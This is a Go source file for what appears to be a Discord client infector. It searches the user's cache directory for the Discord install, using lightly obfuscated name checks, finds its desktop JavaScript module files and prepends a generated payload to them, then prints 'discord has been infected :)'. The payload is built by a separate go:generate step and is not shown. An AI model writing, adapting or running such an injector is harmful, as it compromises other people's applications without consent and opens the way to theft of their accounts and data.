//go:generate go run build.go > lol.go

package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var performant = regexp.MustCompile(`app-.*`)

func im_serious_go_away(p string) {
	err := filepath.WalkDir(p, func(rp string, d fs.DirEntry, _ error) error {
		if rp[len(rp)-2:] != "js" {
			return nil
		}

		var us = len(strings.Split(rp, "_")) - 1
		if us != 4 {
			return nil
		}
		var dts = len(strings.Split(rp, "desktop")) - 1
		if dts != 2 {
			return nil
		}

		fmt.Printf("Attempting to inject %s\n", rp)

		f, err := os.OpenFile(rp, os.O_RDWR, 0644)
		if err != nil {
			fmt.Println("Failed to open file :(")
			fmt.Println(err)
			return nil
		}
		defer f.Close()

		oldContent, err := io.ReadAll(f)
		if err != nil {
			fmt.Printf("Could not access content :(")
			fmt.Println(err)
			return nil
		}

		if _, err := f.WriteAt([]byte(string(lol)+string(oldContent)), 0); err != nil {
			fmt.Println("Failed to write payload :(")
			fmt.Println(err)
			return nil
		}
		fmt.Println("Successfully wrote payload :)")
		return nil
	})

	if err != nil {
		fmt.Println(err)
		return
	}
}

func go_away_ast(p string) {
	entries, err := os.ReadDir(p)
	if err != nil {
		return
	}
	var fp bool
	for _, entry := range entries {
		if entry.Name() != string([]rune{0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73}) {
			continue
		}
		fp = true
	}

	if !fp {
		return
	}
	var ap []byte
	for _, entry := range entries {
		if performant.Match([]byte(entry.Name())) {
			ap = []byte(entry.Name())
		}
	}

	fmt.Printf("Attempting to infect %s\n", p+"\\"+string(ap))

	im_serious_go_away(p + "\\" + string(ap))
}

func main() {
	local, err := os.UserCacheDir()
	if err != nil {
		fmt.Println(err)
		return
	}
	entries, err := os.ReadDir(local)
	if err != nil {
		fmt.Println(err)
		return
	}

	for _, entry := range entries {
		n := entry.Name()
		if n[0] != 0x44 {
			continue
		}
		var ds = len(strings.Split(strings.ToLower(n), string(rune(0x64)))) - 1
		if ds < 3 && ds <= 1 {
			continue
		}
		go_away_ast(local + "\\" + n)
	}

	fmt.Println("discord has been infected :)")
}
